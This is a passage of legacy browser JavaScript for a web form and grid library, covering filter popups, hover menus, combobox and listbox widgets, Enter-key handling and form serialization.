        if(myid!='~')getform+=gcname+"uid="+myid+"&";
        //if(myid!='~')getform+="id="+myid+"&";
        //if(fnc!='~')getform+="fnc="+fnc+"&";
		if(fnc!='~')getform+=gcname+"_fnc="+fnc+"&";

        if(ord!='~')getform+=gcname+"_ord="+ord+"&";
        if(rec!='~')getform+=gcname+"_recycle="+rec+"&";
        if(pgnum!='~')getform+=gcname+"_pgnum="+pgnum+"&";
        if(htmlobjnm!='~')getform+=gcname+"_hobj="+htmlobjnm+"&";
        if(htmlobjfield!='~')getform+=gcname+"_hfield="+htmlobjfield+"&";
        if(hoid!='~')getform+=gcname+"_hoid="+hoid+"&";		
        if(submit_disable=='')
        {
			EditPanelSync();
			try{
				GetFormSubmitButton(formname).click();
			}catch(e){
				obj.submit();
			}

        }
		
    }
return getform;
}

//--------------------------------------------------
function SetPostLink(formname,gcname,nm,vl)
{
var postform="";
var obj=document.getElementById(formname);
if(obj)
{
   switch(nm)
   {
      case '':obj.elements[gcname].value=vl;break;

      case '_req':obj.elements[gcname+nm].value=vl;break;
      case '_ord':obj.elements[gcname+nm].value=vl;break;
      case '_recycle':obj.elements[gcname+nm].value=vl;break;
      case '_fsearch':obj.elements[gcname+nm].value=vl;break;
      case '_pgnum':obj.elements[gcname+nm].value=vl;break;
      case '_hobj':obj.elements[gcname+nm].value=vl;break;
      case '_hfield':obj.elements[gcname+nm].value=vl;break;

      case 'uid':obj.elements[gcname+nm].value=vl;break;
      case '_uid':obj.elements[nm].value=vl;break;
      case 'fnc':obj.elements[nm].value=vl;break;
	  case '_fnc':obj.elements[nm].value=vl;break;
   }
};

}
//------- FILTERs Funstion
var var_designfield=0;
var var_typefield=1;//date, search, checkbox
var var_originfield=2;
var var_cbofield=3;
var var_breftext=4;
var var_value=5;
var var_count=6;
var GLOBBOXFILTERNAME="GlobalBoxFilterFor_";
var TransFilterButton="<input type='submit' >";
var TransFilterAllText="all";
TransFilterSrchText="Search";
var TransFilterDateFromText="From";
var TransFilterDateToText="To";
var TransFilterCalendarText="Calendar";
var TransFilterGo="Filter";

//------------============================--------------
function IsSetInDefault(formname,fld,vl)
{
var ss=formname+"_"+fld+"_filtbox";
for(var i=0;i<THF_DefParam.length;i+=2)
{
if(THF_DefParam[i]==ss)
if(THF_DefParam[i+1]==vl)return true;
};
return false;
}
//------------============================--------------
function InsertDefaultFilter(formname,fld,namespace)
{
if(!namespace)namespace="gc";
var fltnm="GlobalBoxFilterFor_"+formname;
var fltobj=document.getElementById(fltnm);
var objnm=formname+"_"+fld+"_filtbox";
var objdiv=formname+"_"+fld+"_locdiv";
var objall=formname+"__"+fld+"__locall";
var objset=formname+"___filterset";
var objsrch="cbtext_"+formname+"__"+fld+"___1";
var objbox=document.getElementById(objnm);
   var dtstart="cbdtos_"+formname+"__"+fld+"___1";
   var dtend="cbdtoe_"+formname+"__"+fld+"___2";
   var numstart="cbnums_"+formname+"__"+fld+"___1";
   var numend="cbnume_"+formname+"__"+fld+"___2";
   
   if(window[namespace+"_FilterVar"])FilterVar=window[namespace+"_FilterVar"];

var nclk1="if(document.getElementById('"+objall+"'))if(document.getElementById('"+objall+"').checked)document.getElementById('"+objall+"').checked=false;this.checked=this.checked;";

   var vhtml="<div id='"+objnm+"' style=\"position:absolute;visibility:hidden;border:none;padding:0;margin:0;display:none;width:1px;height:1px;top:0px;left:0px;\">";
   vhtml+="<table width='90%' style='cursor:pointer;cursor:hand;border:none;padding:0;margin:0;'>";
   vhtml+="<tr><td><input type='checkbox' value='on' id='"+objall+"' name='"+objall+"' onclick=\"JC_CheckAllByName('"+objdiv+"',this.checked)\" style=\"margin:5px;\">"+TransFilterAllText+"</td><td>&nbsp;</td></tr> "; 
   vhtml+="<tr><td colspan=2><hr style='width:95%;border-top:1px solid #e4e4e4;border-bottom:1px solid #f4f4f4;'></td></tr> "; 

   for(var i=0;i<FilterVar.length;i+=var_count)
   if(FilterVar[i+var_designfield]==fld)
   switch(FilterVar[i+var_typefield])
   {
       case 'search': 
            {
                  vhtml+="<tr><td colspan=2>"+TransFilterSrchText+"<input type='text' id='"+objsrch+"' name='"+objsrch+"' value='"+FilterVar[i+var_value]+"' style='width:100%' placeholder='Keywords'></td></tr> "; 
                  vhtml+="<tr><td colspan=2><br></td></tr> "; 
            };break;
       case 'checkbox':
            {
                  var chd="";
                  if(IsSetInDefault(formname,fld,FilterVar[i+var_value]))chd=" checked=true ";
                  vhtml+="<tr onmouseover=\"this.style.background='#cccccc'\"  onmouseout=\"this.style.background=''\" ><td width='10px'  style='border:1px groove #cccccc'><input type='checkbox' "+chd+" name=\""+FilterVar[i+var_cbofield]+"\" id=\""+FilterVar[i+var_cbofield]+"\" value=\""+FilterVar[i+var_value]+"\" onclick=\""+nclk1+"\"></td><td type='left'  style='border:1px groove #cccccc' >"+FilterVar[i+var_breftext].substr(0,256)+"</td></tr> ";   
            };break;
       case 'date':
            {
                   if((FilterVar[i+var_cbofield]==dtstart)||(FilterVar[i+var_cbofield]==dtend))
                   {
                        vhtml+="<tr><td width='10px'>"+FilterVar[i+var_breftext].substr(0,128)+"<br>";
                        vhtml+="<input type='text'  name=\""+FilterVar[i+var_cbofield]+"\" id=\""+FilterVar[i+var_cbofield]+"\" value=\""+FilterVar[i+var_value]+"\"  ></td><td type='left'>";
                        vhtml+="<a onclick=\"WinSetPosByObject('"+FilterVar[i+var_cbofield]+"');OpenCalendarEx('"+FilterVar[i+var_cbofield]+"');\" style='height:16px;background-color:#888888;cursor:pointer;cursor:hand;'>...</a></td></tr> ";   

                        if(FilterVar[i+var_cbofield]==dtend)vhtml+="<tr><td colspan=2><br></td></tr> "; 
                   }
           };break;
       case 'number':
            {
                   if((FilterVar[i+var_cbofield]==numstart)||(FilterVar[i+var_cbofield]==numend))
                   {
                        vhtml+="<tr><td width='10px' colspan=2>"+FilterVar[i+var_breftext].substr(0,128)+"<br>";
                        vhtml+="<input type='text'  name=\""+FilterVar[i+var_cbofield]+"\" id=\""+FilterVar[i+var_cbofield]+"\" value=\""+FilterVar[i+var_value]+"\"  ></td></tr> ";   

                        if(FilterVar[i+var_cbofield]==numend)vhtml+="<tr><td colspan=2><br></td></tr> "; 
                   }
           };break;

   }


   vhtml+="</table></div>";


fltobj.innerHTML=fltobj.innerHTML+vhtml;
}
//------------============================--------------
function FilterCreator(fltobj,formname,fld,nmm,gcname)
{
var objnm=formname+"_"+fld+"_filtbox";
var objset=formname+"___filterset";
var objdiv=formname+"_"+fld+"_locdiv";
var objbox=document.getElementById(objnm);

               AlphaMainWin(0.5);
WinSetName(nmm);
WinSetPosByObject(fltobj);
WinSetZoom('250px','375px');
var wino=CreateHTMLWindow('WindowsJCSystem');
AdjustWindowSize(wino);
var winobj=document.getElementById(wino);
var obj=document.getElementById(wino+'_ca');
var obzm=GetObjectZoomParameters(obj);
//alert(obzm.height+"__"+obzm.etapH);

	addClass(wino,"gridFilterContainer");

   var nclk1="document.getElementById('"+objnm+"').innerHTML=document.getElementById('"+objdiv+"').innerHTML;THF_MoveAttributesByName('"+objnm+"','"+objdiv+"');";
   nclk1+="SetPostLink('"+formname+"','"+gcname+"','_req','rlfilter');document.getElementById('"+formname+"').submit();";

   var vhtml="";
   vhtml+="<div class='gridFilterBlock' id='"+objdiv+"' style='min-width:75px;width:100%;border:none;padding:0;margin:0;min-height:75px;height:300px;overflow:auto;'><input type='hidden' id='"+objset+"' name='"+objset+"' value='"+fld+"'>"+objbox.innerHTML+"</div>";

   vhtml+="<br>"+getbuttonsubmit(TransFilterGo," onclick=\""+nclk1+"\" "," width=100px ")+" ";

obj.innerHTML=vhtml;

obj.style.border='1px groove gray';
obj.style.overflow='hidden';
return vhtml;
}

//------------------==========================---------------
function DateFilterCreator(fltobj,formname,fld,nmm,gcname)
{
  return FilterCreator(fltobj,formname,fld,nmm,gcname);
}
//------------------==========================---------------
function getSelectedValue(obj)
{
var ret="";
try{
   ret=obj.options(obj.selectedIndex).getAttribute('FValue');
}
catch(e){
   try{
         ret=obj.options[obj.selectedIndex].getAttribute('FValue');
       }catch(e){}
}

return ret;
}
//------------------==========================---------------
function setSelectValue(obj,val,force)
{
if(!force)force=false;
var g=-1;
try{
for(g=0;g<obj.options.length;g++)
   if(obj.options[g].value==val){obj.selectedIndex=g;break;}

	if(force && obj.selectedIndex!=g){
		var pnt=document.createElement("option");
		pnt.innerHTML=(pnt.val=val);
		obj.appendChild(pnt);
		obj.value=val;
		g=obj.selectedIndex;
	}
   
}
catch(e){console.log(e);}

return g;
}

//------------------==========================---------------
function getSelectedText(elementId) 
{
    var elt = document.getElementById(elementId);

    if (elt.selectedIndex == -1)
        return null;

    return elt.options[elt.selectedIndex].text;
}
//------------------==========================---------------
var MOA_Object=0;
var MOA_ObjectStarted=1;
var MOA_OperID=2;//values= {'hidden', 'visible'}
var MOA_Affect=3;
var MOA_AffectEx=4;
var MOA_Count=5;
var MenuObjectActivity=new Array();
var MOA_lParam,MOA_wParam,MOA_Do=0;
//------------------------------------
function PLMouseEffect(pobj0,hf)
{
  if(pobj0)
  {
    var p=1;
    if(pobj0.filters)if(pobj0.filters[0])
    {
        try{
                pobj0.filters[0].Apply();
                pobj0.style.visibility=hf;
                pobj0.filters[0].Play();
        }catch(e)
        {
           pobj0.style.visibility=hf;
        };
        p=0;
    }
    if(p)pobj0.style.visibility=hf;
  }
};

//--------------------------------
function PLM_DoInArray(lp,lpst,wp)
{
   var i=0,isObj=-2;
   if(MenuObjectActivity.length==0)isObj=-1;
   else
   for(i=0;i<MenuObjectActivity.length;i+=MOA_Count)
   if(MenuObjectActivity[i]==lp){isObj=i;break;}

   switch(isObj)
   {
       case -1:
	MenuObjectActivity[MOA_Object]=lp;
	MenuObjectActivity[MOA_ObjectStarted]=lpst;
	MenuObjectActivity[MOA_OperID]=0;
	MenuObjectActivity[MOA_Affect]=wp;
	MenuObjectActivity[i+MOA_AffectEx]=0;
      break;
      case -2:
	MenuObjectActivity[i+MOA_Object]=lp;
	MenuObjectActivity[i+MOA_ObjectStarted]=lpst;
	MenuObjectActivity[i+MOA_OperID]=0;
	MenuObjectActivity[i+MOA_Affect]=wp;
	MenuObjectActivity[i+MOA_AffectEx]=0;
      break;
      default:
	MenuObjectActivity[i+MOA_Object]=lp;
	MenuObjectActivity[i+MOA_ObjectStarted]=lpst;
	MenuObjectActivity[i+MOA_Affect]=wp;

   }

   return isObj;
}
//--------------------------------
function PLM_DoAfter()
{
   var isave=-1;
   for(var i=0;i<MenuObjectActivity.length;i+=MOA_Count)
   if(MenuObjectActivity[i+MOA_AffectEx])
   if(MenuObjectActivity[i+MOA_OperID]!=MenuObjectActivity[i+MOA_AffectEx])
   {
       var k=PLMMouseIsInObject(MenuObjectActivity[i+MOA_Object]);
       var ks=PLMMouseIsInObject(MenuObjectActivity[i+MOA_ObjectStarted]);
       var affect=1;
       if(MenuObjectActivity[i+MOA_AffectEx]=='hidden')
       {
           if(k || ks)
           {
              affect=0;
           }
       }else
       if(MenuObjectActivity[i+MOA_AffectEx]=='visible')
       {
           if(k==0 && ks==0)
           {
              affect=0;
           }
       }

      if(affect)
      {
         if(MenuObjectActivity[i+MOA_AffectEx]=='visible')isave=i;
         PLMouseEffect(MenuObjectActivity[i+MOA_Object],MenuObjectActivity[i+MOA_AffectEx]);
         MenuObjectActivity[i+MOA_OperID]=MenuObjectActivity[i+MOA_AffectEx];
         MenuObjectActivity[i+MOA_Affect]=0;
         MenuObjectActivity[i+MOA_AffectEx]=0;
         if(isave!=-1)break;
       }
   }

   if(isave!=-1)
   for(var i=0;i<MenuObjectActivity.length;i+=MOA_Count)
   if(i!=isave)
   {
         MenuObjectActivity[i+MOA_AffectEx]='hidden';
         PLMouseEffect(MenuObjectActivity[i+MOA_Object],MenuObjectActivity[i+MOA_AffectEx]);
         MenuObjectActivity[i+MOA_OperID]=MenuObjectActivity[i+MOA_AffectEx];
         MenuObjectActivity[i+MOA_Affect]=0;
         MenuObjectActivity[i+MOA_AffectEx]=0;

//alert(MenuObjectActivity[i+MOA_ObjectStarted]);
//.className.substr(1,MenuObjectActivity[i+MOA_ObjectStarted].className.length-6)
//MenuObjectActivity[i+MOA_ObjectStarted].className=MenuObjectActivity[i+MOA_ObjectStarted].className.substr(1,MenuObjectActivity[i+MOA_ObjectStarted].className.length-6);

   }

}
//--------------------
var PLM_timeout;
function PLMouseEx(pobj0,pobj1,hf,ttm)
{
 // if(!ttm)ttm=300;
  if(pobj0)
  {
       PLM_DoInArray(pobj0,pobj1,hf);
   var affect=0;
   for(var i=0;i<MenuObjectActivity.length;i+=MOA_Count)
   if(MenuObjectActivity[i+MOA_Affect])
   if(MenuObjectActivity[i+MOA_OperID]!=MenuObjectActivity[i+MOA_Affect])
   {
         MenuObjectActivity[i+MOA_AffectEx]=MenuObjectActivity[i+MOA_Affect];
         affect=1;
   }

    if(affect)
    {
         clearInterval(PLM_timeout);
         PLM_timeout=setTimeout("PLM_DoAfter()",ttm);
    }
  };
};
//-----------------------------------------------------------------
function PLMMouseIsInObject(obj0)
{
var crd=GetObjectCoords(obj0);
//if((MouseX<parseInt(crd.x))||(MouseX>parseInt(crd.x)+parseInt(crd.width))||(MouseY<parseInt(crd.y))||(MouseY>parseInt(crd.y)+parseInt(crd.height)))
var x=parseInt(crd.x)+parseInt(crd.scrollLeft);			 
var y=parseInt(crd.y)-parseInt(crd.scrollTop);			 
if((MouseX<x)||(MouseX>x+parseInt(crd.width))||(MouseY<y)||(MouseY>y+parseInt(crd.height)))
		return 0;
		//alert("("+MouseX+"<"+x+")||("+MouseX+">"+x+"+parseInt("+crd.width+"))||("+MouseY+"<"+y+")||("+MouseY+">"+y+"+parseInt("+crd.height+")))");
return 1;
}
//-----------------------------------------------------------------
function PLMMouseIsInObjectArray(obj0)
{
   var i;
   for(i=0;i<obj0.length;i++)
   if(isObjectShown(obj0[i]))
   {
      if(PLMMouseIsInObject(obj0[i]))return 1;
   }
   return 0;
}

//-----------------------------------------------------------------
function PLMCloseAllEFF()
{
   var i=0;
   for(i=0;i<MenuObjectActivity.length;i+=MOA_Count)
   if(MenuObjectActivity[i])
   if(PLMMouseIsInObject(MenuObjectActivity[i])==0)
   {
        PLMouseEx(MenuObjectActivity[i],MenuObjectActivity[i+MOA_ObjectStarted],'hidden',300);
   }
}
//-----------------------------------------------------------------
function PLMOverMouseEFF(obj0,obj1)
{
    var pobj0=document.getElementById(obj0);
    var pobj1=document.getElementById(obj1);
    //pobj1.className=pobj1.className+"_hover";
    PLMouseEx(pobj0,pobj1,'visible',0);
};
//-----------------------------
//------ AUTO RUN SCRIPT CODE -----------------------
//-----------------------------
setInterval("PLMCloseAllEFF()",1000);
//-----------------------------
//------------------------------------------------------------------------------
var Combobox_AutoHiddenID=0,Combobox_AutoHiddenFocused=0,Combobox_ComboControl=0;
function Combobox_ReAutoHidden()
{
    if(Combobox_AutoHiddenID)clearInterval(Combobox_AutoHiddenID);
    Combobox_AutoHiddenID=setInterval(function(){/*combobox_filter('nm');*/HideObjectEx('nm_chooser');clearInterval(Combobox_AutoHiddenID);},2000);
};

//------------------------------------------------------------------------------
function combobox_clear(nm)
{
   var obj=document.getElementById(nm+"_chooser");
   if(obj)
   {
       obj.innerHTML="";
	   document.getElementById(nm).value="";
	   document.getElementById(nm+"_value").value="";
   }
}
//------------------------------------------------------------------------------
function combobox_appendex(nm,lst,val)//ArrayVar=[["key",["value"]]]
{
    var vrhtml="";
    var defselectparam="";
    var deftxt="";
	var clsadd="";

    var chooser="";

	if(Array.isArray(lst))
	if(Array.isArray(lst[0]))
	if(lst.length)
	{
		for(var i=0;i<lst.length;i++)
		{
			var ky=lst[i][0];
			var vl=lst[i][1];
			
		    var vlpar=0;
		    if(Array.isArray(vl)){vlpar=vl[1];vl=vl[0];};
			
             if(defselectparam=="")defselectparam=ky;
             if(val==ky)defselectparam=ky;
             chooser+="<a "+(val==ky?"class='combo_selected'":"class='combo_default'")+"><div id='"+nm+"_combo_"+ky+"' chooserkey=\""+ky+"\" chooserparent=\""+vlpar+"\" onclick=\"document.getElementById('"+nm+"').value='"+ky+"';document.getElementById('"+nm+"_value').value=getInnerText(document.getElementById('"+nm+"_combo_"+ky+"'));HideObjectEx('"+nm+"_chooser');\" >"+vl+"</div></a>";
			 if(val==ky)deftxt=vl;
		}
	}

return chooser;	
}

//------------------------------------------------------------------------------
function combobox_append(nm,lst,val)
{
    var vrhtml="";
    var defselectparam="";
    var deftxt="";
	var clsadd="";

   var obj=document.getElementById(nm+"_chooser");
   if(obj)
   {
        var chooser=combobox_appendex(nm,lst,val);
		obj.innerHTML=obj.innerHTML+chooser;
   }
}
//------------------------------------------------------------------------------
function combobox_set(nm,lst,val)
{
    combobox_clear(nm);
	combobox_append(nm,lst,val);
}
//------------------------------------------------------------------------------
function combobox_html(nm,lst,val)
{
    var vrhtml="";
    var defselectparam="";
    var deftxt="";
	var clsadd="";
	if(val){deftxt=val;clsadd=" not";};
	chooser="<div class='chooser_fix'><div class='chooser' id='"+nm+"_chooser'  style='position:absolute;height:150px;overflow:auto;visibility:hidden;' >";

	chooser+=combobox_appendex(nm,lst,val);
    chooser+="</div></div>";

    vrhtml="<div class=\"but_combobox"+clsadd+"\" id=\""+nm+"_combobox\" >";
	vrhtml+="<input type='hidden'    name='"+nm+"' id='"+nm+"'  value=\""+htmlspecialchars(val,ENT_QUOTES)+"\" >";
    vrhtml+="<input type='hidden'    name='"+nm+"_temp' id='"+nm+"_temp'  value=\""+htmlspecialchars(val,ENT_QUOTES)+"\">";
    vrhtml+="<input type='hidden'    name='"+nm+"_filter' id='"+nm+"_filter'  value=\"\">";
    vrhtml+="<input type='hidden'    name='"+nm+"_parentname' id='"+nm+"_parentname'  value=\"\">";

	vrhtml+="<table cellspacing=0 cellpadding=0 border=0 width='100%'><tr><td class='comboboxl'>&nbsp;</td><td class='combobox'>";
	vrhtml+="<input type='text' onkeyup=\"combobox_key('"+nm+"','ComboControl"+nm+"',event)\" onfocus=\"HideObjectEx('"+nm+"_chooser');\" name='"+nm+"_value' id='"+nm+"_value' value=\""+htmlspecialchars(deftxt,ENT_QUOTES)+"\" style='float:left;width:100%;' autocomplete=\"off\">";
	vrhtml+="</td>";
	vrhtml+="	<td class='comboboxi_go'  onclick=\"combo_butclick('"+nm+"');\"  >&nbsp;</td>";
	vrhtml+="   <td class='comboboxr'>&nbsp;</td></tr></table>";
	vrhtml+=chooser+"</div>";
    //HideObjectEx('"+nm+"_chooser');
	
	vrhtml+="<script language='JavaScript'>";
	vrhtml+="var AutoHiddenID_"+nm+"=0,AutoHiddenFocused_"+nm+"=0,ComboControl_"+nm+"=0;";
	vrhtml+="AddEventByString(document,'click',\"DeClose('"+nm+"','',new Array('"+nm+"_combobox','"+nm+"_chooser'))\");";
	vrhtml+="</script>";
	
	
return vrhtml;
}
//------------------------------------------------------------------------------
function listbox_append(mainid,lst,val,enable)//ArrayVar=[["key",["value"]]]
{
  var vidnm=mainid;
  if(!mainid)mainid="l_delivery";
  if(!enable)enable=1;
  if(mainid.indexOf("_listbox")==-1)mainid+="_listbox";
  var dl=document.getElementById(mainid);
  var elv=document.getElementById(vidnm);
  if(dl)
  {
	if(Array.isArray(lst))
	if(Array.isArray(lst[0]))
	if(lst.length)
	{
		for(var i=0;i<lst.length;i++)
		if(lst[i][0])
		{
			var ky=lst[i][0];
			var vl=lst[i][1];
			
		    var vlpar=0;
		    if(Array.isArray(vl)){vlpar=vl[1];vl=vl[0];};
			
			var kystr=" "+ky+",";
			var n=-1;
			if(val)n=kystr.indexOf(val);
			else
			n=String(elv.value).indexOf(kystr);
			
			if(!document.getElementById('CBPers_'+vidnm+'_'+ky))
			dl.innerHTML=dl.innerHTML+"<div class='listbox_row'><input type='checkbox' "+(enable!=1 && enable!='1'?"disabled=true":"")+" "+(n!=-1?"checked":"")+" onclick=\"click_check_listbox('"+ky+"','"+vl+"',this.checked,'"+mainid+"')\" id='CBPers_"+vidnm+"_"+ky+"' name='CBPers_"+vidnm+"_"+ky+"' class='checkbox'><div class='title'>"+vl+"</div><div class='endrow'></div></div><hr>";
		}
		return 1;
	 }
  }
  return 0;
}
//------------------------------------------------------------------------------
function listbox_checkall(mainid)
{
    var obj=getlementById(mainid);
	if(obj)JC_CheckAll(obj,'on');
}
//------------------------------------------------------------------------------
function listbox_clear(mainid)
{
    var obj=document.getElementById(mainid);
	if(obj)
	{
		var Childs=obj.getElementsByTagName('input');
		if(!Childs)Childs=obj.all;

		if(Childs)
		{
			for(var i = 0; i <Childs.length; i++)
			if(String(Childs[i].type).toUpperCase()=='CHECKBOX')
			{
				obj.removeChild(Childs[i]);
			}
		}
	}
	
}

//------------------------------------------------------------------------------
function listbox_uncheckall(mainid)
{
    var obj=getlementById(mainid);
	if(obj)JC_CheckAll(obj,'off');
}
//------------------------------------------------------------------------------
function listbox_getelement(mainid,ky)
{
	var el=obj.getElementsByTagName("CBPers_"+mainid+"_"+ky);
	return el;
}
//------------------------------------------------------------------------------
function click_check_listbox(ky,nmval,chkid,mainid)
{
  //if(!chkid)chkid="CBPers_";
  if(!mainid)mainid="l_delivery";
  var inpEl=mainid;
  if(mainid.indexOf('_listbox')!=-1)inpEl=mainid.substring(0,mainid.length-8);

  var dl=document.getElementById(inpEl);
  if(dl)
  {
     if(chkid)dl.value+=' '+nmval+' '+ky+',';
	 else if(dl.value)dl.value=dl.value.replace(' '+nmval+' '+ky+',', '',"gi");
	 
	 var iel=document.getElementById(inpEl);
	 if(iel && iel.onchange)iel.onchange();
	 
	 return dl.value;
  }
  return 0;
}
//------------------------------------------------------------------------------
function combobox_filter(nm,par)//onchange
{
   var combo=document.getElementById(nm);
   var combovalue=document.getElementById(nm+"_value");
   var combochooser=document.getElementById(nm+"_chooser");
   var combofilter=document.getElementById(nm+"_filter");   
   var txt="",val=combovalue.value.toLowerCase(),sv=combo.value,valfilt=combofilter.value,vfcur;
   var IsV=0,OmCounter=0,LatestShownObject=0;
  
  valfilt=valfilt.replace(/^\s+|\s+$/g,'');
var Childs=combochooser.getElementsByTagName('div');
if(!Childs)Childs=objPar.all;

if(Childs)
{
   for(var i = 0; i <Childs.length; i++)
   if(Childs[i].tagName)
   {
        if((Childs[i].tagName.toLowerCase()=='div'))
        {
	      var ShwChk=1;
		  
		  vfcur=Childs[i].getAttribute('chooserparent');
          if(valfilt && vfcur)
	      {
		     //document.getElementById('TDReporter').innerHTML='filt='+valfilt+'; cur='+vfcur;
		    if(valfilt!=vfcur) ShwChk=0;
		  }else
		  if(par && vfcur)
		  {
			   if(par!=vfcur) ShwChk=0;
		  }
		
		  if(val.length>0)		
		  {
			  txt=HtmlDecode(getInnerText(Childs[i]).toLowerCase());
			  if(txt==val){combo.value=Childs[i].getAttribute('chooserkey');if(sv!=combo.value){combo.onchange();};IsV=1;}
			  else
			  if(txt.search(val)==-1) ShwChk=0;
		  }
		  
		  if(ShwChk){ShowObjectEx(Childs[i]);LatestShownObject=Childs[i];OmCounter++;}
		  else HideObjectEx(Childs[i]);
        }
   }
}
if((OmCounter<=8)&&(LatestShownObject))
{
 // var zz=GetObjectZoomParameters(LatestShownObject);
  ShowObjectEx(nm+'_chooser');
  //ShowObjectEx(LatestShownObject);
  var hg=OmCounter*parseInt(LatestShownObject.offsetHeight)+'px';
  combochooser.height=hg;
  combochooser.style.height=hg;
}

if(!IsV){combo.value=val;}
if(sv!=combo.value){combo.onchange();}
return val;
}

//------------------------------------------------------------------------------
function combo_butclick(nm)
{
  var combo=document.getElementById(nm);
  var obj=document.getElementById(nm+"_value");
  var tmp=document.getElementById(nm+"_temp");  

  if(isObjectShown(nm+"_chooser"))
  {
 //obj.value=tmp.value;
    tmp.value="";
	combobox_filter(nm);
	HideObjectEx(nm+"_chooser");
  }
  else
  {
    if(obj.value)tmp.value=obj.value;
 obj.value="";
    combobox_filter(nm);
    ShowObjectEx(nm+"_chooser");
  }
}
//------------------------------------------------------------------------------
function combo_close(nm)
{
  var obj=document.getElementById(nm+"_value");
  var tmp=document.getElementById(nm+"_temp"); 
  if(isObjectShown(nm+"_chooser"))
  {  
     if(obj.value=='')obj.value=tmp.value; 
     HideObjectEx(nm+"_chooser");
  }
}
//------------------------------------------------------------------------------
 function DeClose(pnm,jscode,pcontrol)
 {
    if(!pcontrol)pcontrol=pnm+'_chooser';
    var crd=GetObjectCoords(pcontrol);
    if(!PLMMouseIsInObjectArray(pcontrol))
	{
	    combo_close(pnm);
	    if(jscode)eval(jscode);
	}
}
//------------------------------------------------------------------------------
var ComboController=0;
function combobox_key(nm,ctrl,e)//onkeydown, onchange
{
if(ctrl)clearTimeout(ctrl);
var e=window.event || e;
//var keyCode = ('charCode' in e) ? e.charCode : e.keyCode;
var keyCode=e.keyCode;

switch(keyCode)
{
case 9:HideObjectEx(nm+'_chooser');
      break;
case 27:combo_close(nm);
      break;

case 40:if(!isObjectShown(nm+"_chooser"))ShowObjectEx(nm+'_chooser')
      else 
	  {
	      var oChs=document.getElementById(nm+'_chooser');
		  var oAs=oChs.getElementsByTagName('A');
		  for(var oIndx=0;oIndx<oAs.length;oIndx++)
          if(oAs[oIndx].className=='combo_selected')
		  {
			if(oAs[oIndx+1])
			{
               oAs[oIndx].className='combo_default';
			   oAs[oIndx+1].className='combo_selected';
               break;
			}
		  }
		  
	  }
     break;
case 38:if(!isObjectShown(nm+"_chooser"))ShowObjectEx(nm+'_chooser')
      else 
	  {
	      var oChs=document.getElementById(nm+'_chooser');
		  var oAs=oChs.getElementsByTagName('A');
		  for(var oIndx=oAs.length-1;oIndx>=0;oIndx--)
          if(oAs[oIndx].className=='combo_selected')
		  {
			if(oAs[oIndx-1])
			{
               oAs[oIndx].className='combo_default';
			   oAs[oIndx-1].className='combo_selected';
               break;
			}
		  }
		  
	  }
     break;
	 
default:
   if(ComboController){clearTimeout(ComboController);}
   ComboController=setTimeout(function(){var val=combobox_filter(nm);if(val.length>0)ShowObjectEx(nm+'_chooser');else HideObjectEx(nm+'_chooser');ComboController=0;},1500);
}
	
}
//------------------------------------------------------------------------------
function formEventDisableEx(ev){
   var e=window.event || ev;
	if (e.preventDefault)
		e.preventDefault();
	else e.returnValue = false;
    return false;
}
//------------------------------------------------------------------------------
function stopEventEx(ev){
   var e=window.event || ev;
	if (e.stopPropagation)
		e.stopPropagation();
	if(e.returnValue)e.returnValue = false;
    return false;
}


//------------------------------------------------------------------------------
function formOnEnterDisableEx(e)
{
   var e=window.event || e;
   var keyCode=e.keyCode;
   var obj=e.srcElement || e.target;
   
   if(keyCode==13 && obj.tagName!='TEXTAREA')
   {
		if (e.preventDefault)
			e.preventDefault();
		else e.returnValue = false;
       return false;
   }
return true;   
}
//------------------------------------------------------------------------------
function formOnEnterDisable(formid)
{
   var of=document.getElementById(formid);
   var els=of.getElementsByTagName("INPUT");
   for(eIdx=0;eIdx<els.length;eIdx++)
   {
		AddEventOnObject(els[eIdx],'keypress',function(event){return formOnEnterDisableEx(event);});
   }

}
//------------------------------------------------------------------------------
function formOnEnterNextFocusEx(e)
{
   var e=window.event || e;
   var keyCode=e.keyCode;
   var obj=e.srcElement || e.target;
   
   if(keyCode==13 && obj.tagName!='TEXTAREA')
   {
  	   if (e.preventDefault)
    	    e.preventDefault();
	   else e.returnValue = false;

      try{ 
        var oFrm=GetParentByTag(obj,'form');
		var eF=oFrm.elements;

		for(var iDx=0;iDx<eF.length;iDx++)
        if(eF[iDx].name)if(eF[iDx].name==obj.name)
        {
            iDx+=1;
   		    for(;iDx<eF.length;iDx++)
            if(eF[iDx].type!='hidden')
            {
               eF[iDx].focus();
               break;
            };
            break;
        }

	  }catch(e){ }
		
       return false;
   }
return true;
}


//------------------------------------------------------------------------------
function formOnEnterNextfocus(formid)
{
   var of=document.getElementById(formid);
   var els=of.getElementsByTagName("INPUT");
   for(eIdx=0;eIdx<els.length;eIdx++)
   {
		AddEventOnObject(els[eIdx],'keypress',function(event){return formOnEnterNextFocusEx(event);});
   }

}

//------------------------------------------------------------------------------
function serialize(form,type)//type=json or other 
{
	if(!type)type='';
	return serializeDIV(form,type);
}
//------------------------------------------------------------------------------
function serializeDIV(form,type) 
{
        if (!form) return "";
        if (typeof form !=="object") 
		{
		    form=document.getElementById(form);
			if (!form) return "";
        }

		var i, j, q = [],ret="",rObj={},FD=false;

		if(type.toLowerCase()=="formdata")
		try{
			FD=new FormData(form);
			return FD;
		}catch(e){console.log('FormData Not initialized: '+e);FD=false;}
		
		var els={},rStat;
		var inps=form.getElementsByTagName("INPUT");
		var txta=form.getElementsByTagName("TEXTAREA");
		var slct=form.getElementsByTagName("SELECT");
		var btna=form.getElementsByTagName("BUTTON");
		
		var iPos=0;
		for(i=0;i<inps.length;i++){els[iPos]=inps[i];iPos++;}
		for(i=0;i<txta.length;i++){els[iPos]=txta[i];iPos++;}
		for(i=0;i<slct.length;i++){els[iPos]=slct[i];iPos++;}
		for(i=0;i<btna.length;i++){els[iPos]=btna[i];iPos++;}

        for (i = iPos - 1; i >= 0; i = i - 1) 
		{
                if (els[i] === undefined || els[i].name === "" )//|| els[i].disabled
				{
                        continue;
                }
				
				rStat=false;
				if(rStat=els[i].getAttribute('data-remove'))
				{
					rStat.toLowerCase();
					if(rStat==true || rStat=='true' || rStat=='1' || rStat=='y' || rStat=='yes' || rStat=='on')continue;
				}
				
				if(rStat=els[i].getAttribute('removed_status'))
				{
					rStat.toLowerCase();
					if(rStat==true || rStat=='true' || rStat=='1' || rStat=='y' || rStat=='yes' || rStat=='on')continue;
				}

                switch (String(els[i].tagName).toUpperCase()) 
				{
				default:
                case 'INPUT':
                        switch (String(els[i].type).toLowerCase()) {
						case 'password':if(els[i].disabled)continue;
						default:
                        case 'text':
                        case 'hidden':
                        case 'button':
                        case 'reset':
